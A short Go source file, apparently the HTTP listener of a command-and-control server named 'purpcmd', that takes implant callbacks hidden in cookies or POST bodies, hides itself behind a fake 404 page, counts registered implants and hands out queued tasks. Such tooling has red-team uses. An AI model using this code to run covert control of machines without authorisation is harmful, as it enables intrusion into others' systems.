package listener

import (
	"io"
	"net/http"
	"purpcmd/server/implant"
	"strings"
)

func (l *Listener)root(w http.ResponseWriter, r *http.Request) {
	a,task := processPayload(r)
	
	if uint16(a) == implant.NIL {
		w.WriteHeader(404)
		w.Write([]byte("Page Not Found"))
		return
	} else if uint16(a) == implant.REG {
		l.Association = l.Association + 1
	}

	w.WriteHeader(200)

	if len(task) >= 8 {
		w.Write(task)
		return
	}
	w.Write([]byte("Hi!"))
}


func processPayload(r *http.Request) (uint16, []byte) {
	var stringReadCloser io.ReadCloser
	
	if r.Method == "GET" {
		cookies := r.Cookies()
		if len(cookies) == 0 {
			return implant.NIL, []byte{}
		} else {
			stringReader := strings.NewReader(cookies[0].Value)
			stringReadCloser = io.NopCloser(stringReader)
		}
	} else if r.Method == "POST" {
		stringReadCloser = r.Body
	}

	return implant.ParseCallback(stringReadCloser, r)
}